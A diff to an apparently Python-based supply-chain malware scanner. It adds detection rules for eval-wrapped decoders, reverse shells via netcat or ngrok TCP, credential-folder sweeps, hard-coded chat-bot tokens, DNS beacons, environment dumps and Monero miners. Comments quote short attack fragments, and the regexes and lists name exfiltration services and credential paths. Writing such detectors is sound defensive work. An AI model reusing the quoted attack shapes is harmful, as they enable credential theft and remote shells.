@@ -606,6 +606,22 @@ R("SC-PACKER", "Packed JavaScript (p,a,c,k,e,d)", "VULN", "CRITICAL", ("js",),
   "Legitimate modern packages ship minified, not packed; packing hides intent.",
   "Unpack and review the payload before trusting this file.",
   "CWE-506 · Supply chain"),
+# eval of what a function written into the call decodes from a long encoded
+# literal (0.1.8): the 2026 wave that compromised awaitly, executable-stories-
+# vitest and three @redhat-cloud-services packages shipped a 4 MB index.js of
+# `try{eval(function(s,n){…String.fromCharCode((c.charCodeAt(0)-b+n)%26+b)…}
+# ([40,107,99,…], n))}catch(e){}` — a letter shift over character codes, run
+# as the package loads or installs. SC-PACKER's general case: any decoder
+# function, over at least 200 character codes or 1,000 characters of text.
+# None of the benchmark's 429 popular packages has one.
+R("SC-EVAL-DECODER", "Code decoded by its own function and run", "VULN", "CRITICAL", ("js",),
+  r"\beval\s*\(\s*\(?\s*function\s*\([^()]{0,80}\)\s*\{(?:[^{}]|\{[^{}]{0,2000}\}){0,2000}\}\s*\)?\s*\(\s*"
+  r"(?:\[\s*\d+(?:\s*,\s*\d+){199}|'[^'\n]{1000}|\"[^\"\n]{1000}|`[^`]{1000})",
+  "eval runs what a function written into the call decodes from a long encoded literal.",
+  "An inline decoder over a blob of character codes or text keeps a payload out of sight: the file shows the "
+  "decoder, never the code it runs.",
+  "Decode the blob and read what it runs; treat the package as hostile until then.",
+  "CWE-506 · Supply chain"),
 # Marshalled bytecode that is run, or that comes from bytes embedded or
 # decoded in the code itself: `exec(marshal.load(f))`,
 # `FunctionType(marshal.loads(b), …)`, `marshal.loads(b"\xe3…")`,
@@ -5152,6 +5168,10 @@ def _scan_file(path, content, lines, lang, dep, ctx, issues):
                  "why": "Embedded encoded blobs can carry second-stage payloads.",
                  "fix": "Decode and verify the content; move legitimate assets to data files.",
                  "ref": "CWE-506 · Supply chain"}, path, i + 1, lines, bm.start()))
+        if lang in ("js", "py"):
+            off = offscreen_code(line, lang)
+            if off is not None and ctx.names_code(i).strip():
+                issues.append(_offscreen_issue(path, i + 1, lines, off))
         # --- entropy-based secret detection ---
         # (review fix: the S-TOKEN/S-SECRET dedupe was an any() over every
         # issue so far, per line — 15.7 s on 20k lines; now a set lookup)
@@ -5181,6 +5201,11 @@ def _scan_file(path, content, lines, lang, dep, ctx, issues):
                  "fix": "Diff against the package's published repository; consider removing the dependency.",
                  "ref": "CWE-506 · Supply chain"}, path, first_line, lines,
                 first_off - content.rfind("\n", 0, first_off) - 1))
+    if lang in ("js", "py"):
+        at = self_publish_at(content)
+        if at >= 0:
+            issues.append(mk_issue(_SELF_PUBLISH_RULE, path, content.count("\n", 0, at) + 1, lines,
+                                   at - content.rfind("\n", 0, at) - 1))
     if dep:
         _dep_decode_flow(path, ctx, issues)
         return
@@ -5600,6 +5625,9 @@ _SCRIPT_EXT_RE = re.compile(r"\.(?:c|m)?js$|\.sh$|\.py$", re.I)
 _ENV_ASSIGN_RE = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*=")
 
 
+_HOOK_FALLBACK_TOKEN_RE = re.compile(r"&&|\|\||[;|&()]|[^\s;|&()]+")
+
+
 def _hook_tokens(cmd):
     """Shell-like tokenization of an npm script: quotes respected, operators
     (&& || ; | & parentheses) as their own tokens. Never raises."""
@@ -5610,7 +5638,7 @@ def _hook_tokens(cmd):
         lex.commenters = ""
         return list(lex)
     except ValueError:                     # unbalanced quotes: best effort
-        return re.findall(r"&&|\|\||[;|&()]|[^\s;|&()]+", cmd)
+        return _HOOK_FALLBACK_TOKEN_RE.findall(cmd)
 
 
 def _local_module(value):
@@ -5933,11 +5961,14 @@ _SECRET_SOURCE_RE = re.compile(
     # shell: the whole environment piped or redirected somewhere
     r"""|(?:^|[\s;&(`])(?:env|printenv|set)\s*(?:\|(?!\|)|>)|\$\(\s*(?:env|printenv)\s*\)|`\s*(?:env|printenv)\s*`""",
     re.I | re.M)
+# RequestBin by its host names only (0.1.8): the bare word is also the start
+# of requestBinary(), which chromedriver's and phantomjs-prebuilt's installers
+# define to download their binaries.
 _EXFIL_SERVICES = (
     r"""pastebin\.com|\bngrok|webhook\.site|"""
     r"""discord(?:app)?\.com/api/webhooks|api\.telegram\.org|oastify\.com|burpcollaborator|"""
-    r"""\binteract\.sh|\boast\.(?:pro|live|site|online|fun|me)\b|requestbin|pipedream\.net|"""
-    r"""transfer\.sh|\.onion\b""")
+    r"""\binteract\.sh|\boast\.(?:pro|live|site|online|fun|me)\b|requestbin\.(?:com|net|io)\b|\brequestb\.in\b|"""
+    r"""pipedream\.net|transfer\.sh|\.onion\b""")
 _EXFIL_DEST_RE = re.compile(r"""https?://(?:\d{1,3}\.){3}\d{1,3}\b|""" + _EXFIL_SERVICES, re.I)
 _EXFIL_SERVICE_RE = re.compile(_EXFIL_SERVICES, re.I)      # the named ones, no raw IPs
 # `curl … | sh` / `wget … | bash`, read in one left-to-right pass: a pipe into
@@ -6142,6 +6173,16 @@ def reverse_shell_at(text):
         m = _REVSHELL_JS_SPAWN_RE.search(text)
         if m and _REVSHELL_JS_PIPE_RE.search(text) and _REVSHELL_JS_NET_RE.search(text):
             return m.start()
+    # an argument list (`spawn('nc', [host, port, '-e', '/bin/sh'])`), or a
+    # shell or netcat run with an ngrok TCP address (0.1.8)
+    if any(nd in text for nd in _REVSHELL_ARGS_NEEDLES):
+        m = _REVSHELL_ARGS_RE.search(text)
+        if m:
+            return m.start()
+    if any(nd in text for nd in _REVSHELL_NGROK_NEEDLES):
+        m = _REVSHELL_NGROK_TCP_RE.search(text)
+        if m and _REVSHELL_ARG_SHELL_RE.search(text) and _EXEC_CALL_RE.search(text):
+            return m.start()
     return -1
 
 
@@ -6150,13 +6191,267 @@ _HOST_INFO_RE = re.compile(
     r"|os\.hostname|os\.userInfo)\s*\("
     r"""|\b(?:getoutput|check_output|getstatusoutput|execSync|popen)\s*\(\s*\[?\s*["'](?:whoami|hostname|id|uname"""
     r"""|ifconfig|ipconfig|systeminfo)\b"""
-    r"|(?:\$\(|`)\s*(?:whoami|hostname|id|uname|ifconfig|ip\s+a|pwd|ls|cat\s+/etc/passwd|ps)\b")
+    r"|(?:\$\(|`)\s*(?:whoami|hostname|id|uname|ifconfig|ip\s+a|pwd|ls|cat\s+/etc/passwd|ps)\b"
+    r"|\bos\.(?:hostname|userInfo)\s*[,)]")
 
 
 def sends_host_info(text):
     """True when `text` collects the machine's user or host name (or runs
     whoami, hostname, ifconfig …) and sends data over the network."""
     return bool(_HOST_INFO_RE.search(text) and (_NETWORK_RE.search(text) or _EXFIL_SERVICE_RE.search(text)))
+
+
+# Exfiltration shapes (0.1.8, from the rerun's misses that GuardDog caught).
+# Each one is strong wherever it is found — in an install script, in code
+# that runs on import, in the files a package runs when used — and none
+# was found in the benchmark's 429 popular packages:
+# - A chat bot or webhook whose secret is written in the code: a Telegram
+#   bot token (next to api.telegram.org), a Discord webhook's token or a
+#   Slack webhook's key, in a file that makes network calls. A library that
+#   talks to these services takes the key from its user; a package that
+#   ships its author's key reports whoever runs it to the author (figlets
+#   zips Exodus wallets and sends them to its bot; requestn uploads every
+#   file in the working folder). Placeholders (T00000000/…/XXXX, a secret of
+#   one repeated letter) are not keys.
+# - Credential files (.env, .npmrc, .pypirc, .netrc, .git-credentials,
+#   ~/.aws/credentials, an SSH private key, Docker's or kubectl's config)
+#   read in a file that sends data to a raw public IP address.
+# - Several credential folders named in one place (.ssh, .aws, .ethereum,
+#   .kube …: three or more within _CRED_SWEEP_SPAN characters) in a file
+#   that makes network calls: a sweep of the home folder for secrets.
+# - The machine's user or host name sent to an address the file keeps
+#   base64-encoded (a literal that decodes to "http…"), or looked up in DNS
+#   inside a name the code builds (the dependency-confusion DNS beacon), and
+#   the machine's public IP address (from ipify, ip-api …) sent to a
+#   data-capture service; an ngrok tunnel's own address counts as one.
+# - The whole environment copied to a variable and serialized
+#   (`d = dict(os.environ)` … `urlencode(d)`): read with the harvest test.
+# - A reverse shell given to an exec call as an argument list, or to an
+#   ngrok TCP address (`spawn('bash', ['-i', 'nc', '2.tcp.eu.ngrok.io', …])`).
+# - At install time only: a raw socket to a hard-coded IP address, as the
+#   test already reads a URL with one (loopback, and the public DNS
+#   resolvers a connectivity check uses, are not one).
+# - A cryptocurrency miner: a Monero wallet address in a file that runs a
+#   program with a mining pool's arguments (`-o pool:port`, stratum+tcp://,
+#   --donate-level, xmrig) — ultralytics 8.3.42 ran XMRig from safe_run().
+_CHAT_SECRET_RE = re.compile(
+    r"(?<![0-9])\d{8,10}:AA[A-Za-z0-9_-]{33}(?![A-Za-z0-9_-])"
+    r"|\b[Dd]iscord(?:app)?\.com/api/webhooks/\d{17,20}/[A-Za-z0-9_-]{60,80}"
+    r"|\bhooks\.slack\.com/services/T[A-Z0-9]{8,12}/B[A-Z0-9]{8,12}/[A-Za-z0-9]{24}(?![A-Za-z0-9])")
+_TELEGRAM_API_RE = re.compile(r"api\.telegram\.org", re.I)
+_CHAT_SECRET_NEEDLES = (":AA", "webhooks/", "hooks.slack.com")   # one is in every match
+_CHAT_SECRET_MAX = 50            # matches examined per text
+_CHAT_SECRET_MIN_DISTINCT = 10   # distinct characters a real secret has
+_CRED_FILE_RE = re.compile(
+    r"""["'`](?:~[/\\]|\.[/\\])?\.(?:env|npmrc|pypirc|netrc|git-credentials)["'`]"""
+    r"""|\.aws[/\\]credentials\b|[/\\]\.ssh[/\\]id_\w+|\.docker[/\\]config\.json|\.kube[/\\]config\b""")
+_PUBLIC_IP_URL_RE = re.compile(
+    r"\b(?:https?|wss?|tcp)://(?!(?:10|127|0)\.)(?!192\.168\.)(?!172\.(?:1[6-9]|2\d|3[01])\.)(?!169\.254\.)"
+    r"(?:(?:25[0-5]|2[0-4]\d|1?\d?\d)\.){3}(?:25[0-5]|2[0-4]\d|1?\d?\d)(?![\d.])")
+_CRED_DIR_RE = re.compile(
+    r"""["'`](?:~[/\\]|\$HOME[/\\]|%USERPROFILE%[/\\])?\.(ssh|aws|azure|gnupg|docker|kube|ethereum|electrum|bitcoin"""
+    r"""|solana|npmrc|pypirc|netrc|git-credentials|config[/\\]gcloud|password-store|vault-token|terraform\.d)"""
+    r"""(?:[/\\][^"'`\n]{0,60})?["'`]""")
+_CRED_SWEEP_NEEDLES = (".ssh", ".aws", ".azure", ".gnupg", ".docker", ".kube", ".ethereum", ".electrum", ".bitcoin",
+                       ".solana", ".npmrc", ".pypirc", ".netrc", ".git-credentials", ".config", ".password-store",
+                       ".vault-token", ".terraform.d")
+_CRED_SWEEP_SPAN = 400           # characters the credential folders are named within
+_CRED_SWEEP_MIN = 3              # distinct credential folders that make a sweep
+_CRED_SWEEP_MAX = 200            # folder names examined per text
+_B64_URL_LITERAL_RE = re.compile(r"""["'`]aHR0c[A-Za-z0-9+/]{2,}={0,2}["'`]""")
+# a DNS lookup of a name built in an f-string or a template literal (the
+# name, at most 300 characters, is read on its own; the first
+# _DNS_LOOKUP_MAX lookups of a text are)
+_DNS_LOOKUP_RE = re.compile(
+    r"""(?:\b(?:getaddrinfo|gethostbyname(?:_ex)?)|\bdns\.(?:promises\.)?(?:resolve\w*|lookup)"""
+    r"""|\bresolver\.(?:resolve|query))\s*\(\s*(?:f"([^"\n]{0,300})"|f'([^'\n]{0,300})'|`([^`\n]{0,300})`)""")
+_DNS_BUILT_NAME_RE = re.compile(r"\{[^}\n]+\}[^\n]*\.[A-Za-z]{2,}\Z")
+_DNS_LOOKUP_MAX = 50
+_PUBLIC_IP_LOOKUP_RE = re.compile(
+    r"\bapi(?:64)?\.ipify\.org\b|\bip-api\.com\b|\bipinfo\.io\b|\bifconfig\.me\b|\bicanhazip\.com\b"
+    r"|\bcheckip\.amazonaws\.com\b|\bipapi\.co\b|\bident\.me\b|\bapi\.myip\.com\b|\bwtfismyip\.com\b")
+_PUBLIC_IP_LOOKUP_NEEDLES = ("ipify.org", "ip-api.com", "ipinfo.io", "ifconfig.me", "icanhazip.com",
+                             "checkip.amazonaws.com", "ipapi.co", "ident.me", "api.myip.com", "wtfismyip.com")
+_ENV_COPY_RE = re.compile(
+    r"(?<![\w$.])([A-Za-z_$][\w$]*)\s{0,40}=\s{0,40}(?:dict\(\s*os\.environ\s*\)|os\.environ\.copy\(\s*\)"
+    r"|\{\s*\*\*\s*os\.environ\s*\}|\{\s*\.\.\.\s*process\.env\s*\}|Object\.assign\(\s*\{\s*\}\s*,\s*process\.env\s*\))")
+_ENV_COPY_MAX = 20               # copies examined per text
+# a copy's name serialized: the pattern built around it (the name escaped between)
+_ENV_COPY_USE_HEAD = r"\b(?:urlencode|dumps|stringify|b64encode|str)\(\s*"
+_ENV_COPY_USE_TAIL = r"\s*[,)]"
+# what every copy _ENV_COPY_RE finds contains: a text without it is not read
+# for the (slower) assignment
+_ENV_COPY_ANCHOR_RE = re.compile(
+    r"dict\(\s*os\.environ\s*\)|os\.environ\.copy\(\s*\)|\*\*\s*os\.environ|\.\.\.\s*process\.env"
+    r"|Object\.assign\(\s*\{\s*\}\s*,\s*process\.env")
+_REVSHELL_NGROK_TCP_RE = re.compile(r"\b\d+\.tcp(?:\.[a-z]{2,3})?\.ngrok\.io\b", re.I)
+_REVSHELL_ARG_SHELL_RE = re.compile(
+    r"""["'](?:nc|ncat|netcat|(?:/bin/)?(?:ba|z|da)?sh|cmd(?:\.exe)?|powershell(?:\.exe)?)["']""")
+_REVSHELL_ARGS_RE = re.compile(
+    r"""["'](?:nc|ncat|netcat)["'][^\n]{0,160}?["']-[ec]["']\s*,\s*["'](?:/bin/)?(?:ba|z|da)?sh["']""")
+_REVSHELL_ARGS_NEEDLES = ("'nc'", '"nc"', "'ncat'", '"ncat"', "'netcat'", '"netcat"')
+# What an ngrok TCP address holds (case as written: the prefilter of the
+# case-blind _REVSHELL_NGROK_TCP_RE). Needles, like the lists beside them:
+# a plain `".ngrok.io" in text` reads to code scanners as a URL check.
+_REVSHELL_NGROK_NEEDLES = (".ngrok.io",)
+_IP_LITERAL_RE = re.compile(
+    r"""["'](?!(?:127|0|255)\.)((?:(?:25[0-5]|2[0-4]\d|1?\d?\d)\.){3}(?:25[0-5]|2[0-4]\d|1?\d?\d))["']""")
+_RAW_CONNECT_RE = re.compile(
+    r"\b(?:socket\.create_connection|net\.connect|net\.createConnection|connect(?:_ex)?)\s*\(|\bnew\s+net\.Socket\b")
+_RAW_CONNECT_SPAN = 600          # characters after an IP literal searched for the connection
+_IP_LITERAL_MAX = 100            # IP literals examined per text
+_MONERO_ADDR_RE = re.compile(r"(?<![A-Za-z0-9])[48][1-9A-HJ-NP-Za-km-z]{94}(?:[1-9A-HJ-NP-Za-km-z]{11})?(?![A-Za-z0-9])")
+_MINER_ARG_RE = re.compile(r"""["'](?:-o|--url)["']|\bstratum\+(?:tcp|ssl|tls)://|--donate-level\b|\b(?:xmrig|XMRig|XMRIG)\b""")
+_MINER_ARG_NEEDLES = ("'-o'", '"-o"', "'--url'", '"--url"', "stratum+", "--donate-level", "xmrig", "XMRig", "XMRIG")
+_PUBLIC_RESOLVERS = frozenset({"8.8.8.8", "8.8.4.4", "1.1.1.1", "1.0.0.1", "9.9.9.9", "149.112.112.112",
+                               "208.67.222.222", "208.67.220.220"})
+
+
+def chat_secret_at(text):
+    """(offset, reason) of the first chat bot or webhook secret of `text`
+    (see above) in a file that makes network calls, else None."""
+    if not any(nd in text for nd in _CHAT_SECRET_NEEDLES):
+        return None
+    if not _NETWORK_RE.search(text):
+        return None
+    for k, m in enumerate(_CHAT_SECRET_RE.finditer(text)):
+        if k >= _CHAT_SECRET_MAX:
+            break
+        found = m.group(0)
+        if found.startswith(("discord", "Discord")):
+            hook, secret = found.rsplit("/", 2)[1:]
+            if len(set(secret)) >= _CHAT_SECRET_MIN_DISTINCT:
+                return m.start(), f"sends data to a Discord webhook whose token is written in the code (webhook {hook})"
+        elif found.startswith("hooks."):
+            team, _bot, secret = found.rsplit("/", 3)[1:]
+            if len(set(secret)) >= _CHAT_SECRET_MIN_DISTINCT and team.strip("T0"):
+                return m.start(), f"sends data to a Slack webhook whose key is written in the code ({team})"
+        else:
+            bot, secret = found.split(":", 1)
+            if len(set(secret)) >= _CHAT_SECRET_MIN_DISTINCT and _TELEGRAM_API_RE.search(text):
+                return m.start(), f"sends data to a Telegram bot whose token is written in the code (bot {bot})"
+    return None
+
+
+def credential_sweep_at(text):
+    """(offset, names) where `text` names _CRED_SWEEP_MIN or more distinct
+    credential folders within _CRED_SWEEP_SPAN characters, else None."""
+    if sum(1 for nd in _CRED_SWEEP_NEEDLES if nd in text) < _CRED_SWEEP_MIN:
+        return None
+    found = []
+    for k, m in enumerate(_CRED_DIR_RE.finditer(text)):
+        if k >= _CRED_SWEEP_MAX:
+            break
+        found.append((m.start(), m.group(1).replace("\\", "/")))
+    for i, (at, _name) in enumerate(found):
+        names = []
+        for at2, name in found[i:]:
+            if at2 - at > _CRED_SWEEP_SPAN:
+                break
+            if name not in names:
+                names.append(name)
+        if len(names) >= _CRED_SWEEP_MIN:
+            return at, names
+    return None
+
+
+def env_copy_serialized_at(text):
+    """The offset where `text` serializes a copy of the whole environment
+    it made (`d = dict(os.environ)` … `urlencode(d)`), else -1."""
+    if ("os.environ" not in text and "process.env" not in text) or _ENV_COPY_ANCHOR_RE.search(text) is None:
+        return -1
+    for k, m in enumerate(_ENV_COPY_RE.finditer(text)):
+        if k >= _ENV_COPY_MAX:
+            break
+        use = re.compile(_ENV_COPY_USE_HEAD + re.escape(m.group(1)) + _ENV_COPY_USE_TAIL)
+        u = use.search(text, m.end())
+        if u:
+            return u.start()
+    return -1
+
+
+def _exfil_signs(text, host):
+    """(offset, reason) of the exfiltration shapes above that `text` shows,
+    and of a miner, for the install-script and import-time tests (the
+    whole-environment copy and the reverse shell are read by those tests'
+    own checks). `host`: _HOST_INFO_RE.search(text)."""
+    signs = []
+    at = miner_at(text)
+    if at >= 0:
+        signs.append((at, "runs a cryptocurrency miner (a Monero wallet address)"))
+    chat = chat_secret_at(text)
+    if chat is not None:
+        signs.append(chat)
+    net = []                          # _NETWORK_RE's answer, searched once when needed
+
+    def network():
+        if not net:
+            net.append(_NETWORK_RE.search(text) is not None)
+        return net[0]
+    ip = _PUBLIC_IP_URL_RE.search(text)
+    if ip:
+        cred = _CRED_FILE_RE.search(text)
+        if cred and network():
+            signs.append((cred.start(), "reads credential files and sends data to an IP address "
+                                        f"({ip.group(0).split('//', 1)[1]})"))
+    sweep = credential_sweep_at(text)
+    if sweep is not None and network():
+        signs.append((sweep[0], "collects files from several credential folders and sends data over the network "
+                                f"({', '.join('.' + n for n in sweep[1][:4])})"))
+    if host:
+        if _B64_URL_LITERAL_RE.search(text) and network():
+            signs.append((host.start(), "sends the machine's user or host name to an address it hides in base64"))
+        at = dns_beacon_at(text)
+        if at >= 0:
+            signs.append((at, "sends the machine's user or host name in a DNS lookup of a name it builds"))
+    elif any(nd in text for nd in _PUBLIC_IP_LOOKUP_NEEDLES):
+        lookup = _PUBLIC_IP_LOOKUP_RE.search(text)
+        if lookup:
+            capture = capture_service(text)
+            if capture:
+                signs.append((lookup.start(), "sends the machine's public IP address to a data-capture service "
+                                              f"({capture.group(0)[:40]})"))
+    return signs
+
+
+def dns_beacon_at(text):
+    """The offset of a DNS lookup of a name `text` builds from values
+    (`getaddrinfo(f"{h}.{u}.x.com")`, `dns.lookup(`${h}.x.com`)`), else -1."""
+    for k, m in enumerate(_DNS_LOOKUP_RE.finditer(text)):
+        if k >= _DNS_LOOKUP_MAX:
+            break
+        name = next(g for g in m.groups() if g is not None)
+        if _DNS_BUILT_NAME_RE.search(name):
+            return m.start()
+    return -1
+
+
+def miner_at(text):
+    """The offset of the Monero wallet address `text` runs a miner with (see
+    above), else -1."""
+    if not any(nd in text for nd in _MINER_ARG_NEEDLES) or _MINER_ARG_RE.search(text) is None:
+        return -1
+    m = _MONERO_ADDR_RE.search(text)
+    if m and _EXEC_CALL_RE.search(text):
+        return m.start()
+    return -1
+
+
+def raw_ip_connect(text):
+    """The first hard-coded IP address `text` opens a raw socket to (a
+    literal with a connection within _RAW_CONNECT_SPAN characters after it;
+    loopback and the public DNS resolvers excepted), else None — install
+    time only."""
+    if "connect" not in text and "Socket" not in text:
+        return None
+    for k, m in enumerate(_IP_LITERAL_RE.finditer(text)):
+        if k >= _IP_LITERAL_MAX:
+            break
+        if m.group(1) in _PUBLIC_RESOLVERS:
+            continue
+        if _RAW_CONNECT_RE.search(text, m.end(), m.end() + _RAW_CONNECT_SPAN):
+            return m.group(1)
+    return None
 
 
 # Code read back from the file itself (0.1.7). A payload — or a hint such as
@@ -6173,6 +6468,18 @@ def sends_host_info(text):
 # runners). A .py or .js file read and run is not: setup.py's
 # `exec(open("pkg/version.py").read())` reads a version. The import-time test
 # reads a file that reads its own source with its prose (_import_code).
+#
+# (0.1.8) The data file may be a licence or a readme without an extension,
+# which holds no code (react-thunk-log 2.23.2 kept its payload, encrypted, in
+# lib/utils/smtp-connection/LICENSE, next to the script its install hook
+# starts); what a read gives may arrive asynchronously — the second parameter
+# of the read's callback (`fs.readFile(p, 'utf8', (err, data) => …)`), the
+# parameter of a `.then(…)` chained to it, a Python `with open(…) as f`; and
+# the path may be built on a line of its own and read by its name (`const p =
+# path.join(__dirname, 'LICENSE')` … `fs.readFile(p, …)`). A value that comes
+# from a path read by name counts only in a code runner (eval, exec, compile,
+# new Function, vm.run*): a CLI reads its package.json by name and puts the
+# version in a git command.
 _SELF_READ_RE = re.compile(
     r"\bopen\s*\(\s*(?:os\.path\.(?:abspath|realpath)\s*\(\s*)?__file__\b"
     r"|\bPath\s*\(\s*__file__\s*\)\s*\.\s*(?:read_text|read_bytes|open)\s*\("
@@ -6181,21 +6488,43 @@ _SELF_READ_RE = re.compile(
     r"|fileURLToPath\s*\(\s*import\.meta\.url)|\barguments\s*\.\s*callee\b|\}\s*\)?\s*\.\s*toString\s*\(\s*\)")
 _DATA_EXT = (r"(?:txt|dat|bin|png|jpe?g|gif|ico|bmp|svg|wav|mp3|mp4|woff2?|ttf|json|md|cfg|ini|log|db|pyc|so|dll"
              r"|dylib|exe)")
+# a data file's name inside quotes: a data extension, or a licence or readme
+# with or without one (no template's `${…}` in it: a name that runs into one
+# is read again from every delimiter)
+_DATA_FILE = (r"(?:[^\"'`{}$\n]{1,100}\." + _DATA_EXT + r"|(?:[^\"'`{}$\n]{0,100}[/\\])?"
+              r"(?:LICEN[CS]E|COPYING|NOTICE|README|AUTHORS|CHANGELOG|CHANGES|HISTORY|PATENTS)(?:[-.]\w{1,10})?)")
 _SIBLING_DATA_RE = re.compile(
     r"\b(?:open|read_text|read_bytes|readFileSync|readFile)\s*\([^\n]{0,200}?(?:__file__|__dirname|import\.meta\.url)"
-    r"[^\n]{0,200}?[\"'][^\"'\n]{1,100}\." + _DATA_EXT + r"[\"']"
-    r"|(?:__file__|__dirname)[^\n]{0,200}?[\"'][^\"'\n]{1,100}\." + _DATA_EXT + r"[\"'][^\n]{0,60}?"
+    r"[^\n]{0,200}?[\"']" + _DATA_FILE + r"[\"']"
+    r"|(?:__file__|__dirname)[^\n]{0,200}?[\"']" + _DATA_FILE + r"[\"'][^\n]{0,60}?"
     r"\.\s*(?:read_text|read_bytes)\s*\(")
+# a data file's path, assigned to a name: the file named after __file__,
+# __dirname or import.meta.url, in quotes or after a template's `${__dirname}/`
+_SIBLING_PATH_RE = re.compile(
+    r"(?:__file__|__dirname|import\.meta\.url)[^\n]{0,200}?(?:[\"'`]|\}[/\\])" + _DATA_FILE + r"[\"'`]")
+# a read of a path by its name (the name is checked against the data-file
+# paths), a read call's head, the node-style callback in its arguments, and
+# what may follow the call: `.then(x => …)` or Python's `as f`
+_PATH_READ_RE = re.compile(
+    r"\b(?:open|read_text|read_bytes|readFileSync|readFile)\s*\(\s*([A-Za-z_$][\w$]*)\s*[,)]"
+    r"|(?<![\w$.])([A-Za-z_$][\w$]*)\s*\.\s*(?:read_text|read_bytes)\s*\(")
+_READ_HEAD_RE = re.compile(r"\b(?:open|read_text|read_bytes|readFileSync|readFile)\s*\(")
+_READ_CALLBACK_RE = re.compile(r"\(\s*[A-Za-z_$][\w$]*\s*,\s*([A-Za-z_$][\w$]*)\s*\)\s*(?:=>|\{)")
+_READ_THEN_RE = re.compile(
+    r"\s*(?:\.\s*then\s*\(\s*(?:async\s+)?(?:function\b\s*[\w$]*\s*)?\(?\s*([A-Za-z_$][\w$]*)|as\s+([A-Za-z_]\w*))")
 _SELF_RUN_RE = re.compile(
     r"(?<![\w.$])(?:exec|eval|compile)\s*\(|\bnew\s+Function\s*\(|\bvm\s*\.\s*run\w*\s*\("
     r"|\b(?:execSync|system|popen|Popen|check_output|getoutput)\s*\(|\bsubprocess\s*\.\s*\w+\s*\(")
+# the runners that run a shell command, not code
+_SELF_SHELL_RUNNERS = ("execSync", "system", "popen", "Popen", "check_output", "getoutput", "subprocess")
 _SELF_READ_ASSIGN_RE = re.compile(
     r"(?<![^\n])[ \t]*(?:(?:const|let|var)[ \t]+)?([A-Za-z_$][\w$]*)[ \t]*(?::[^=\n]*)?=(?![=>])([^\n]*)")
 _IDENT_TOKEN_RE = re.compile(r"(?<![\w$.])[A-Za-z_$][\w$]*")
 _SELF_READ_PASSES = 3            # levels of names followed from a read
-_SELF_READ_MAX_CALLS = 200       # runners examined per text
-_SELF_READ_ARG_SPAN = 2000       # characters of a runner's arguments read
+_SELF_READ_MAX_CALLS = 200       # runners examined per text, and read calls
+_SELF_READ_ARG_SPAN = 2000       # characters of a runner's or a read's arguments read
 _SELF_READ_MAX_ASSIGNS = 5000    # assignments examined per text
+_SELF_READ_THEN_SPAN = 200       # characters after a read's call searched for .then( or `as`
 
 
 def reads_own_source(text):
@@ -6257,38 +6586,77 @@ def runs_own_source_at(text):
     source or from a data file shipped next to it (see above), else -1.
     Runners, reads and names inside string literals do not count (a code
     template in a string, a list of dunder names)."""
-    if not (_SELF_READ_RE.search(text) or _SIBLING_DATA_RE.search(text)):
+    if not (_SELF_READ_RE.search(text) or _SIBLING_DATA_RE.search(text) or _SIBLING_PATH_RE.search(text)):
         return -1
     spans = _literal_spans(text)
     starts = [s for s, _ in spans]
 
-    def in_literal(pos):
+    def literal_at(pos):
+        """The literal (start, end) that pos is in, or None."""
         k = bisect.bisect_right(starts, pos) - 1
-        return k >= 0 and pos < spans[k][1]
+        return spans[k] if k >= 0 and pos < spans[k][1] else None
+
+    def in_literal(pos):
+        return literal_at(pos) is not None
 
     def reads(lo, hi):
         part = text[lo:hi]
         return any(not in_literal(lo + m.start()) for rx in (_SELF_READ_RE, _SIBLING_DATA_RE)
                    for m in rx.finditer(part))
 
-    def uses(lo, hi, names):
-        return any(m.group() in names and not in_literal(lo + m.start())
-                   for m in _IDENT_TOKEN_RE.finditer(text[lo:hi]))
+    def path_reads(lo, hi):
+        return bool(paths) and any((m.group(1) or m.group(2)) in paths and not in_literal(lo + m.start())
+                                   for m in _PATH_READ_RE.finditer(text[lo:hi]))
 
-    if not reads(0, len(text)):
-        return -1
+    def uses(lo, hi, names):
+        return bool(names) and any(m.group() in names and not in_literal(lo + m.start())
+                                   for m in _IDENT_TOKEN_RE.finditer(text[lo:hi]))
+
     assigns = []
     for k, m in enumerate(_SELF_READ_ASSIGN_RE.finditer(text)):
         if k >= _SELF_READ_MAX_ASSIGNS:
             break
         if not in_literal(m.start(1)):
             assigns.append((m.group(1), m.start(2), m.end(2)))
-    names = set()
+    paths = set()                   # names of data files' paths (a template's `${__dirname}` counts)
+    for name, lo, hi in assigns:
+        for m in _SIBLING_PATH_RE.finditer(text[lo:hi]):
+            lit = literal_at(lo + m.start())
+            if lit is None or text[lit[0]] == "`":
+                paths.add(name)
+                break
+    if not (reads(0, len(text)) or path_reads(0, len(text))):
+        return -1
+    names = set()                   # values of a read written out: any runner
+    code_names = set()              # values of a path read by name: code runners only
+    for k, h in enumerate(_READ_HEAD_RE.finditer(text)):
+        if k >= _SELF_READ_MAX_CALLS:
+            break
+        if in_literal(h.start()):
+            continue
+        args = _call_args(text[h.end():h.end() + _SELF_READ_ARG_SPAN])
+        close = h.end() + len(args)                 # the closing bracket, when there is one
+        into = (names if reads(h.start(), close + 1) else code_names if path_reads(h.start(), close + 1)
+                else None)
+        if into is None:
+            continue
+        cb = _READ_CALLBACK_RE.search(args)
+        if cb is not None and not in_literal(h.end() + cb.start()):
+            into.add(cb.group(1))
+        if close < len(text) and text[close] == ")":
+            then = _READ_THEN_RE.match(text[close + 1:close + 1 + _SELF_READ_THEN_SPAN])
+            if then is not None:
+                into.add(then.group(1) or then.group(2))
     for _ in range(_SELF_READ_PASSES):
         grown = False
         for name, lo, hi in assigns:
-            if name not in names and (reads(lo, hi) or uses(lo, hi, names)):
+            if name in names:
+                continue
+            if reads(lo, hi) or uses(lo, hi, names):
                 names.add(name)
+                grown = True
+            elif name not in code_names and (path_reads(lo, hi) or uses(lo, hi, code_names)):
+                code_names.add(name)
                 grown = True
         if not grown:
             break
@@ -6299,6 +6667,8 @@ def runs_own_source_at(text):
             continue
         hi = m.end() + len(_call_args(text[m.end():m.end() + _SELF_READ_ARG_SPAN]))
         if reads(m.end(), hi) or uses(m.end(), hi, names):
+            return m.start()
+        if not m.group().startswith(_SELF_SHELL_RUNNERS) and (path_reads(m.end(), hi) or uses(m.end(), hi, code_names)):
             return m.start()
     return -1
 
@@ -6433,10 +6803,193 @@ def dumps_workflow_secrets(text):
     return _SECRETS_DUMP_RE.search(text) is not None and _PERSIST_WORKFLOW_RE.search(text) is not None
 
 
+# A browser's shortcuts rewritten to start it with an extension the script
+# wrote (0.1.8): python-dateuti's setup.py wrote a clipboard-stealing
+# extension to %APPDATA% and added `--load-extension=` to every Chrome, Edge
